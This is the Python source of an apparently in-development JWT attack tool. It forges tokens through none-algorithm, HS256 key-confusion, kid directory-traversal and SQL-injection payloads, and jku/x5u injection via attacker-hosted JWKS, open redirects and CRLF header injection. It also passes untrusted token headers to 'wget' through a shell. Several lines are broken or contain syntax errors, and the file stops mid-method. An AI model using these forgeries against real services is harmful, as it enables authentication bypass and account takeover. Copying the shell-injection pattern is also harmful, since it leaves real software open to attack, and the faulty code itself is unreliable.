#!/usr/bin/python3

"""
   A file for test new implementation globally, before merging in the main file.
   All functions that have been already tested in demo.py, with positives result,
   should be tested here before be implemented in the real script jwt-crack.py.
"""


__version__ = "0.1"
__author__ = "DontPanicO"

import os
import sys
import subprocess
import hmac
import hashlib
import base64
import json
import OpenSSL
import re
import binascii
import argparse
import urllib.parse
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

#OBTAIN THE PATH OF crafted DIRECTORY
try:
    from config import cwd
except ImportError:
    path = os.path.abspath(sys.argv[0])
    cwd = "/".join(path.split("/")[:-1]) + "/"


class Bcolors:
    """
    A class used to store colors in some constant, to be retrieved later in the script to return a fancy output.
    """
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Cracker:

    description = "A command line tool for test security of JWTs"

    usage = """
        python3 jwt-crack.py <token> [OPTIONS]; OR
        jwtcrk <token> [OPTIONS]; IF YOU HAVE USED install.py
	"""

    man = """
        python3 jwt-crack.py <token> [options]; OR
        jwtcrk <token> [options]; IF YOU HAVE USED install.py
        
        Positional:
        token                      [Your JWT.]
        
        Optional:
        -a --alg <alg>             [The algorithm; None, none, HS256, RS256.]
        -k --key <path>            [The path to the key if it's needed.]
        -p --payload <key:value>   [The field you want to change in the payload.]
           --remove-from <sec:key> [A key to remove from a section (header or payload) of
                                    the token.]
           --add-into <sec:key>    [Same as --remove-from but add. This is needed since for some
                                    attack, like jku/x5u related ones, the tool won't automatically
                                    insert new headers in the token. Use this option to force the
                                    tool to add the header. The tool will assign a default value to
                                    the new header, so you should run an attack that will process
                                    that header.]
        -d --decode                [Decode the token and quit.]
           --unverified            [Act as the host does not verify the signature.]
           --auto-try <hostname>   [If it's present the script will retrieve the key
                                    using openssl. If the host uses this key to signs
                                    its token, it will work.]
           --specify-key <string>  [A string used as key.]
           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli.]
           --jku-basic <yourURL>   [Basic jku injection. jku attacks are complicated, you need
                                    some configs. You have to host the jwks.json crafted file
                                    on your pc or on a domain you own. Pass it to this parameter,
                                    but don't force a path; jwks have a common path, pass only
                                    the first part of the url, '/.well-known/jwks.json' will be
                                    automatically appended. Look at the examples for more details.]
           --jku-redirect <mainURL,yourURl>
                                   [Try to use an open redirect to make the jku header pointing to
                                    your url. To do this you need to specify the exact place in
                                    the main url, where your url has to be attached. This is done
                                    with the keyword HERE. Look at the examples for more details.]
           --jku-body <mainURL>    [Try to exploit an http header injection to inject the jwks in
                                    the http response of the url. Use the HERE keyword to let the
                                    tool know where to inject the jwks.]
           --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
                                    an url to a jwks file containing a certificate. The tool will
                                    generate a certificate an wiil craft a proper jwks file.]
           --x5u-body <mainURL>    [Same as --jku-body but with x5u header.]
           --manual                [This bool flag allow you to manually craft an url for the jku
                                    or x5u header, if used with --jku-basic or --x5u-basic.
                                    This is needed since in some situations, automatic options
                                    could be a limit. So if you need to pass a defined url, pass
                                    this option, and to the url you specified in --jku-basic or
                                    --x5u-basic, the tool won't append anything. This option is not
                                    compatible with other jku/x5u options.]
        
        Examples:
        jwtcrk <token> --decode
        jwtcrk <token> --alg None --payload <key>:<value>
        jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
        jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
        jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
        jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com

        Documentation: http://
        """

    command = [sys.argv[i] for i in range(len(sys.argv))]

    output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
{Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
{Bcolors.HEADER}Author:{Bcolors.ENDC} {Bcolors.OKCYAN}{__author__}{Bcolors.ENDC}
{Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
        """

    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False):
        """
        :param token: The user input token -> str.
        :param alg: The algorithm for the attack. HS256 or None -> str.
        :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
        :param user_payload: What the user want to change in the payload -> list.
        :param remove_from: What the user want to delete in the header or in the payload -> list.
        :param add_into: What the user want to add in the header (useless in the payload) -> list.
        :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
        :param kid: The type of payload to inject in the kid header. DirTrv or SQLi -> str.
        :param specified_key: A string set to be used as key -> str.
        :param jku_basic: The main url on which the user want to host the malformed jwks file -> str.
        :param jku_redirect: Comma separated server url and the user one -> str.
        :param jku_header_injection: The server url vulnerable to HTTP header injection -> str
        :param x5u_basic: The main url on which the user want to host the malformed jwks file -> str.
        :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str.
        :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool.
        :param decode: A flag to set if the user need only to decode the token -> Bool.
        :param manual: A flag to set if the user need to craft an url manually -> Bool.

        Initialize the variables that we need to be able to access from all the class; all the params plus
        self.file and self.token. Then it call the validation method to validate some of these variables (see below),
        and lastly create a token dictionary, with dictionarize_token, and get decoded header and payload out of it.

        """
        print(Cracker.output)
        self.token = token
        self.alg = alg
        self.path_to_key = path_to_key
        """self.file and self.key will be overriden later"""
        self.file = None
        self.key = None
        self.user_payload = user_payload
        self.remove_from = remove_from
        self.add_into = add_into
        self.auto_try = auto_try
        self.kid = kid
        self.specified_key = specified_key
        self.jku_basic = jku_basic
        self.jku_redirect = jku_redirect
        self.jku_header_injection = jku_header_injection
        self.x5u_basic = x5u_basic
        self.x5u_header_injection = x5u_header_injection
        self.unverified = unverified
        self.decode = decode
        self.manual = manual
        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_body]
        self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
        self.devnull = open(os.devnull, 'wb')
        # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)		# DEBUG
        """Call the validation"""
        self.validation()
        self.token_dict = Cracker.dictionarize_token(token)
        self.original_token_header, self.original_token_payload = Cracker.decode_encoded_token(self.token_dict)

    def validation(self):
        """
        Does some validation on; self.token, self.alg, and all key related arguments.
        This function is written in a terrible way, but it works. Since it has to handle so many different use cases
        for now it's enough. If you want to make some restyle, without compromising its functionality, you're welcome.

        1)Validate the token: Using check_token, looks if the token is valid. If not quits out.

        2)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none it reminds
        to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 or rs256
        has been passed as alg. Last but not least, if any jku/x5u argument is present, it force the alg to be RSA.
        Since the user can not passes more than one jku/x5u related argument, the script look for that and eventually quits.

        3)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
        This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
        to the right argument. First, if a jku/x5u argument has been passed, the scripts checks that no other key related one
        has been passed too, and if it quits out. Else it generates a priv pub pair with openssl, or read from a file in case
        of x5u and extracs the modulus and the esponent. Since now, if any jku/x5u arg has been passed, we know that not other
        args has, so the validation ends here.
        If it goes on, it means that we have no jku/x5u arg, so we don't need to check for it later in the function.
        If an hostname for self.auto_try has been passed, it call get_key_from_ssl_cert and stores it in self.path_to_key.
        In this check, if we have self.kid, self.specified or self.path_to_key the script quits, cause of the conflict(self.kid
        uses preset keys). Then it validate self.kid: if self.path_to_key or self.specified has been passed, returns an error
        and quits. Else goes on and checks that self.kid has a proper value. Then if self.specified has been passed, checks that
        self.path_to_key has not (at this point we know that other args has not been passed since we have already validated
        them), and store self.specified value in self.key. Last, if we have self.path_to_key, checks that the path exists and that
        the algorithm has a proper value. Then read the file and store it in self.key.

        """
        """Validate the token"""
        token_is_valid = Cracker.check_token(self.token)
        if not token_is_valid:
            print("ERROR: Invalid token!")
            sys.exit(2)
        """Validate alg"""
        if self.alg is not None:
            valid_algs = ["None", "none", "HS256", "hs256", "RS256", "rs256"]
            if self.alg not in valid_algs:
                print(f"{Bcolors.FAIL}ERROR: Invalid algorithm.{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.alg == "hs256":
                    self.alg = "HS256"
                elif self.alg == "None" or self.alg == "none":
                    print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
                elif self.alg == "rs256" or self.alg == "RS256":
                    if not any(arg is not None for arg in self.jwks_args):
                        print(f"{Bcolors.FAIL}ERROR: RS256 is supported only for jku injection for now.{Bcolors.ENDC}")
                        sys.exit(1)
                    if self.alg == "rs256":
                        self.alg = "RS256"
        """Force self.alg to RS256 for jku attacks"""
        if any(arg is not None for arg in self.jwks_args):
            if len(list(filter(lambda x: x is not None, self.jwks_args))) > 1:
                print(f"{Bcolors.FAIL}ERROR: You can't use two jku or x5u injections at the same time.{Bcolors.ENDC}")
                sys.exit(1)
            if self.alg is not None and self.alg != "RS256":
                print(f"{Bcolors.WARNING}WARNING: With jku/x5u injections, alg will be forced to RS256.{Bcolors.ENDC}")
            self.alg = "RS256"
        """--manual can be used only with jku-basic or x5u-basic"""
        if self.manual:
            if not self.jku_basic and not self.x5u.basic:
                print(f"{Bcolors.FAIL}ERROR: You can use --manual only with jku/x5u basic.{Bcolors.ENDC}")
                sys.exit(1)
        """Validate key"""
        # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
        if any(arg is not None for arg in self.jwks_args):
            other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key]
            """With jku, you can't use other key related args"""
            if any(arg is not None for arg in other_key_related_args) or self.unverified:
                print(f"{Bcolors.FAIL}ERROR: please don't pass any key related args with jku attacks.{Bcolors.ENDC}")
                sys.exit(2)
            if not self.x5u_basic and not self.x5u_header_injection:
                """Generate a key with OpenSSL"""
                key = OpenSSL.crypto.PKey()
                key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
                self.key = key
            else:
                subprocess.run(self.x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull)
                """Read the key from private.pem"""
                key_file = open("key.pem", 'r')
                key_read = key_file.read()
                key_file.close()
                key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, key_read)
                self.key = key
            """The key is converted in a cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object"""
            self.key.priv = key.to_cryptography_key()
            """Same but _RSAPublicKey object"""
            self.key.pub = self.key.priv.public_key()
            """Extract modulus and exponent"""
            self.key.pub.e = self.key.pub.public_numbers().e
            self.key.pub.n = self.key.pub.public_numbers().n
        if self.auto_try is not None:
            if self.kid is not None or self.specified_key is not None or self.path_to_key:
                print(f"{Bcolors.FAIL}ERROR: --inject-kid uses preset keys, this creates a conflict with --auto-try.{Bcolors.ENDC}")
                sys.exit(2)
            path = Cracker.get_key_from_ssl_cert(self.auto_try)
            self.path_to_key = path
        if self.kid is not None:
            if self.path_to_key is not None or self.specified_key is not None:
                print(f"{Bcolors.FAIL}ERROR: You don't need to specify a key for kid injections{Bcolors.ENDC}")
                sys.exit(2)
            else:
                if self.kid.lower() == "dirtrv":
                    self.kid = "DirTrv"
                    self.key = ""
                elif self.kid.lower() == "sqli":
                    self.kid = "SQLi"
                    self.key = "zzz"
                else:
                    print(
                        f"{Bcolors.FAIL}ERROR: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}",
                        Cracker.usage
                    )
                    sys.exit(2)
        elif self.specified_key is not None:
            if self.path_to_key is not None:
                print(f"{Bcolors.FAIL}ERROR: You have passed two keys with --specify and --key.{Bcolors.ENDC}")
            self.key = self.specified_key
        if self.path_to_key is not None:
            if not os.path.exists(self.path_to_key):
                print(f"{Bcolors.FAIL}ERROR: Seems like the file does not exist{Bcolors.ENDC}")
                sys.exit(2)
            elif self.alg == "None" or self.alg == "none":
                print(f"{Bcolors.FAIL}ERROR: You don't need a key with the None algo{Bcolors.ENDC}")
                sys.exit(2)
            else:
                self.file = open(self.path_to_key, 'r')
                self.key = self.file.read()

    def decode_and_quit(self):
        """
        The JWT "decoding" function.

        Since the decoded header and payload are already been stored when the __init__ method ran, it just displays
        them on the screen.
        This function is intended to run if -d (or --decode) is present so it prints outs some warnings if useless
        parameters have been called along with -d itself.

        """
        other_args = [
                      self.alg, self.path_to_key, self.user_payload,
                      self.auto_try, self.kid, self.specified_key,
                      self.jku_basic, self.jku_redirect, self.jku_header_injection,
                      self.remove_from, self.x5u_basic, self.x5u_body,
        ]
        if any(arg is not None for arg in other_args) or self.unverified, or self.manual:
            print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
        print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
              "\n" +
              f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
              )
        sys.exit(0)

    def modify_header_and_payload(self):
        """
        Starting from the originals decoded header and payload, modify them according to the user input.

        Using json, the function create two dictionaries of self.original_token_header and self.original_token_payload,
        in order to access and modify them as dict object. If add_into is present, the function validates it and add the
        specified key/s in the specified dictionary. If we have some header injection like kid or jku, the script modifys
        those headers with the related payload.
        It changes the algorithm to the one specified by the user, then look he has also declared any payload change.
        If he has, the function calls the change_payload method, for each change stored in self.user_payload.
        If self.remove_from has been passed, it removes the speicifed key/s from the corresponding dictionary.

        N.B. self.user_payload is a list and, any time the user call a -p, the value went stored in another list inside
        self.user_payload. So it basically contains as many list as the user calls to --payload. And the value of each
        calls will always be the firs and only element of each list.

        :return: The modified header and payload strings.
        """
        header_dict = json.loads(self.original_token_header)
        payload_dict = json.loads(self.original_token_payload)
        header_dict['alg'] = self.alg
        if self.add_into:
            for item in self.add_into:
                to_dict = item[0].split(":")[0]
                to_add = item[0].split(":")[0]
                if to_dict != "header" and to_dict != "payload":
                    print(f"{Bcolors.FAIL}You can delete keys only from header and payload.{Bcolors.ENDC}")
                    sys.exit(2)
                if to_dict == "header":
                    if to_add in header_dict.keys():
                        print(f"{Bcolors.FAIL}You are trying to add a key that alreay exists.{Bcolors.ENDC}")
                        sys.exit(1)
                    header_dict[to_add] = "default"
                elif to_dict == "payload":
                    print(f"{Bcolors.WARNING}Adding key to payload is useless since you can do it directly via --payload.{Bcolors.ENDC}")
                    if to_add in header_dict.keys():
                        print(f"{Bcolors.FAIL}You are trying to add a key that already exists.{Bcolors.ENDC}")
                        sys.exit(2)
                    payload_dict[to_add] = "default"
        if self.kid:
            header_dict['kid'] = self.inject_kid()
        elif self.jku_basic:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                sys.exit(2)
            if self.manual:
                url = self.jku_basic
            else:
                url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = url
        elif self.jku_redirect:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                sys.exit(2)
            main_url = self.jku_redirect.split(",")[0]
            your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = main_url.replace("HERE", your_url)
        elif self.jku_header_injection:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has no jku.{Bcolors.ENDC}")
                sys.exit(2)
            body = self.jku_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.jku_header_injection.replace("HERE", injection)
            header_dict['jku'] = url
        elif self.x5u_basic:
            if "x5u" not in header_dict.keys():
                print(f"{Bcolors.FAIL}ERROR: JWT header has no x5u.{Bcolors.ENDC}")
                sys.exit(2)
            if self.manual:
                url = self.x5u_basic
            else:
                url = self.x5u_basic.rstrip("/") + "/.well-known/jwks.json"
            self.x5u_basic_attack(header_dict)
            header_dict['x5u'] = url
        elif self.x5u_header_injection:
            if "x5u" not in header_dict.keys():
                print("{}{}")
                sys.exit(2)
            body = self.x5u_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.x5u_header_injection.replace("HERE", injection)
            header_dict['x5u'] = url
        if self.user_payload:
            for item in self.user_payload:
                payload_dict = Cracker.change_payload(item[0], payload_dict)
        if self.remove_from:
            for item in self.remove_from:
                from_dict = item[0].split(":")[0]
                to_del = item[0].split(":")[1]
                if from_dict != "header" and from_dict != "payload":
                    print(f"{Bcolors.FAIL}You can delete keys only from header or payload{Bcolors.ENDC}")
                    sys.exit(2)
                if from_dict == "header" and to_del == "alg" or from_dict == "header" and to_del == "typ":
                    print(f"{Bcolors.FAIL}Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
                    sys.exit(1)
                if from_dict == "header":
                    header_dict = Cracker.delete_key(header_dict, to_del)
                elif from_dict == "payload":
                    payload_dict = Cracker.delete_key(payload_dict, to_del)
        new_header = json.dumps(header_dict).replace(", ", ",").replace(": ", ":")
        new_payload = json.dumps(payload_dict).replace(", ", ",").replace(": ", ":")
        return new_header, new_payload

    def jku_basic_attack(self, header):
        """
        :param header: the header dictionary to modify -> dict.
        Get the jwks.json file from the url specified in the jku header. Then loads the file as json and accesses
        it to change the modulus and the esponent with the ones of our generated key. Then creates a new file in
        crafted/jwks.json and write into it the dumps of the dict.
        """
        command = "wget " + header['jku']
        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
        jwks = open(filename)
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        file = open(f"{cwd}crafted/jwks.json", 'w')
        file.write(json.dumps(jwks_dict))
        file.close()
        os.remove(filename)

    def jku_via_header_injection(self, header):
        """
        :param header: the header dictonary to modify -> dict.
        Same as self.jku_basic_attack, but instead of write a jwks file, it returns in an http response body
        format.

        :return: The crafted jwks string in an http response body format.
        """
        command = "wget " + header['jku']
        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
        jwks = open(filename)
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['e'] = base64.urlsafe_b64encode(
            (self.key.pub.e).to_bytes((self.key.pub.e).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
            (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
        ).decode('utf-8').rstrip("=")
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def x5u_basic_attack(self, header):
        command = "wget " + header['x5u']
        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        # Retrieve the right filename    TODO: Implement it in a better way
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        jwks = open(filename)
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['x5c'] = x5c_
        file = open("{cwd}crafted/jwks.json", 'w')
        file.write(json.dumps(jwks_dict))
        file.close()
        os.remove(filename)

    def x5u_via_header_injection(self, header):
        command = "wget " + header['x5u']
        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        for file in os.listdir():
            if file.endswith(".json"):
                filename = file
                break
        else:
            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        jwks = open(filename)
        jwks_dict = json.load(jwks)
        jwks_dict['keys'][0]['x5c'] = x5c_
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def select_signature(self, partial_token):
        """
        Creates a signature for the new token.

        :param partial_token: The first two part of the crafted jwt -> str.

        If self.unverified is present its define the signature as the one of the original token.
        It then checks which algorithm has been chosen by the user; with 'None' algorithm it stores an empty string
        as signature, while with HS256 it encrypts the partial_token with the key (self.keys) and, of course, using
        sha256. It encodes it in base64, and strip all trailing '='. With RSA it use self.key.priv to sign the token
        and we use another module to that since is the one that define the class of which self.key.priv is instance
        of, and we need a padding that this module provides us.

        :return: The generated signature.
        """
        if self.unverified:
            signature = self.token_dict['signature']
        else:
            if self.alg == "None" or self.alg == "none":
                signature = ""
            elif self.alg == "HS256":
                if self.key is None:
                    print(f"{Bcolors.FAIL}ERROR: Key is needed with HS256{Bcolors.ENDC}")
                    sys.exit(2)
                signature = base64.urlsafe_b64encode(
                    hmac.new(bytes(self.key, "utf-8"), partial_token.encode('utf-8'), hashlib.sha256).digest()
                ).decode('utf-8').rstrip("=")
            elif self.alg == "RS256":
                signature = base64.urlsafe_b64encode(
                    self.key.priv.sign(
                        bytes(partial_token, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15()
                    )
                ).decode('utf-8').rstrip("=")
        return signature

    def inject_kid(self):
        """
        A function to test for injections in the kid header.

        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.

        This function is intended to be update with new payloads, the first update should be for the ruby RCE

        :return: The related payload string

        """
        kid_payloads = {
            "DirTrv": "../../../../../dev/null",
            "SQLi": "0001' union select 'zzz",
        }

        if self.kid == "DirTrv":
            return kid_payloads['DirTrv']
        elif self.kid == "SQLi":
            return kid_payloads['SQLi']

    @staticmethod
    def check_token(token):
        """
        A method for verify if a JWT have a valid pattern.

        :param token: A JWT -> str.

        Creates a regex pattern and looks if the token match it.

        :return: True, if the token match the pattern, False if not. Bool.
        """
        token_pattern = r"^.+\..+\..*$"
        match = re.match(token_pattern, token)
        if match:
            return True
        else:
            return False

    @staticmethod
    def dictionarize_token(token):
        """
        A method that stores in a dict the three part ok a JWT.

        :param token: A JWT -> str.

        Splits the token in three part (header, payload, signature) and creates a dict with thees data.

        :return: The created dict object
        """
        token_list = token.split(".")
        if len(token_list) < 3:
            token_list.append("")
        token_dict = dict(header=token_list[0], payload=token_list[1], signature=token_list[2])
        return token_dict

    @staticmethod
    def append_equals_if_needed(string):
        """
        Corrects a string that is intended to be base64 decoded.

        :param string: A string, base64 encoded part of a JWT -> str.

         Since JWT are base64 encoded but the equals signs are stripped, this function append them to string
         given as input, only if necessary.

         If the string can't be decoded after the second equal sign has been appended, it return an error.

        :return: A byte-string ready to be base64 decoded.
        """
        encoded = string.encode()
        final_text = b""
        i = 0
        while not final_text:
            try:
                decoded = base64.urlsafe_b64decode(encoded)
                final_text = encoded
                return final_text
            except binascii.Error:
                if i == 2:
                    print(f"{Bcolors.FAIL}ERROR: Seems like the token is not base64 encoded or simply invalid{Bcolors.ENDC}")
                encoded += b'='
                i += 1

    @staticmethod
    def url_escape(string, chars, spaces=True):
        """
        :param string: The string to url encode -> str
        :param chars: The only characters to encode in the string -> str
        :param spaces: If true automatically appends a space to the characters to encode -> bool

        The function, given a string, replaces the characters specified in the chars parameter with their url encoded one.
        By default, if the space character is not specified in the chars parameter, the function automatically appends it.

        :return: The original string with the specified characters url encoded
        """
        if " " not in chars and spaces:
            chars += " "
        encoded = [urllib.parse.quote(char) for char in chars]
        for i in range(len(chars)):
            string = string.replace(chars[i], encoded[i])
        return string

    @staticmethod
    def decode_encoded_token(iterable):
        """
        :param iterable: A dict object populated with the three parts of a JWT -> dict.

        This function simply take the header and the payload from a dictionary created with dictionarize_token, passes
        them to append_equals_if_needed and decodes them.

        :return: The decoded header, and the decoded payload as strings.
        """
        if iterable['header'] is None or iterable['payload'] is None:
            print(f"{Bcolors.OKBLUE}Please pass the token dict as parameter{Bcolors.ENDC}")
        header_b64 = Cracker.append_equals_if_needed(iterable["header"])
        payload_b64 = Cracker.append_equals_if_needed(iterable["payload"])
        try:
            header_ = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        except UnicodeDecodeError:
            print(f"{Bcolors.FAIL}ERROR: Decoding Error. Please be sure, to print a valid jwt.{Bcolors.ENDC}")
            sys.exit(2)
        return header_, payload_

    @staticmethod
    def change_payload(user_input, iterable):
        """
        :param user_input: One of the input name:value passed by the user to change data in the payload -> str.
        :param iterable: A dict object representing the original decoded payload of the JWT -> dict.

        Given a string with this 'name:value' format, splits it, look for a <name> key in the iterable and, if it's,
        change its value to <value>. If it doesn't find <name> in the iterable's keys, print an error and quits out.

        :return: The dictionary with the changes done.
        """
        try:
            user_payload = user_input.split(":")
            user_payload_name = user_payload[0]
            user_payload_value = user_payload[1]
        except IndexError:
            print(f"{Bcolors.FAIL}ERROR: Payload must have this syntax: name:value. You have write '{user_input}'{Bcolors.ENDC}")
            sys.exit(2)
        if user_payload_name not in iterable.keys():
            print(f"{Bcolors.WARNING}WARNING: can't find {user_payload_name} in the token payload. It will be added{Bcolors.ENDC}")
        iterable[user_payload_name] = user_payload_value
        return iterable

    @staticmethod
    def delete_key(iterable, key):
        """
        :param iterable: The header dictionary or the payload one -> dict.
        :param key: A key the user wants to delete from the dictionary -> str.

        The function first checks that the specified key exists in the dictionary, else return an error and quits out.
        If the key exists, it delete the related item from the dictionary.

        :return: The dictionary with the specified item deleted
        """
        if key not in iterable.keys():
            print(f"{Bcolors.FAIL}The key {key} does not exists in the specified section.{Bcolors.ENDC}")
            sys.exit(2)
        else:
            del iterable[key]
            return iterable

    @staticmethod
    def encode_token_segment(json_string):
        """
        :param json_string. A decoded string of the header or the payload, with the values changed according to the
        user input -> str.

        Pretty self explanatory...

        :return: The base64 encoded string, so one part of the final token.
        """
        encoded_new_segment_bytes = base64.urlsafe_b64encode(json_string.encode("utf-8"))
        encoded_new_segment_string = str(encoded_new_segment_bytes, 'utf-8').rstrip("=")
        return encoded_new_segment_string

    @staticmethod
    def craft_token(header_, payload_):
        """
        :param header_: The decoded header, with the values changed according to the user input -> str.
        :param payload_: The decoded payload, with the values changed according to the user input -> str.

        Calls encode_token_segment on the header_ and the payload_ and then sum them.

        :return: The encoded header + the encoded payload as string. Basically two part of a complete JWT.
        """
        encoded_header = Cracker.encode_token_segment(header_)
        encoded_payload = Cracker.encode_token_segment(payload_)
        return encoded_header + "." + encoded_payload

    @staticmethod
    def get_key_from_ssl_cert(hostname):
        """
        :param hostname. The hostname of which you want to retrieve the cert -> str.

        First open devnull to redirect stdin, stdout or stderr if necessary, and defines a regex pattern to match the output of
        our first command. Then defines the command that we need to retrieve an ssl cert and launches it with subprocess and handle
        enventual errors. At this points, the function uses regex to grab the content that wee need, and writes that content in a
        file. Then defines the second command that we need, and launches it. Since this command should have no output, if we have,
        breaks out and returns an error. Else stores the path for the generated key, and closes devnull.

        :retrun the path to the generated key.
        """
        devnull_ = open(os.devnull, 'wb')
        pattern = r'(?:Server\scertificate\s)((.|\n)*?)subject='
        # GET CERT.PEM
        first_command = f"openssl s_client -connect {hostname}:443"
        try:
            first_command_output = subprocess.check_output(
                first_command, shell=True, stdin=devnull_, stderr=devnull_
            ).decode('utf-8')
        except subprocess.CalledProcessError:
            print(
                f"{Bcolors.FAIL}ERROR: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
            )
            sys.exit(2)
        cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
        # WRITE CERT.PEM
        with open("cert.pem", 'w') as file:
            file.write(cert)
        # EXTRACT KEY.PEM
        second_command = "openssl x509 -in cert.pem -pubkey -noout > key.pem"
        second_command_output = subprocess.check_output(
            second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
        )
        if second_command_output:
            print(f"{Bcolors.FAIL}ERROR: Maybe the cert is not valid.{Bcolors.ENDC}")
            sys.exit(2)
        key = f"{os.getcwd()}/key.pem"
        devnull_.close()
        return key

    def run(self):
        if self.decode:
            self.decode_and_quit()
        if self.alg is None:
            print(f"{Bcolors.FAIL}ERROR: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
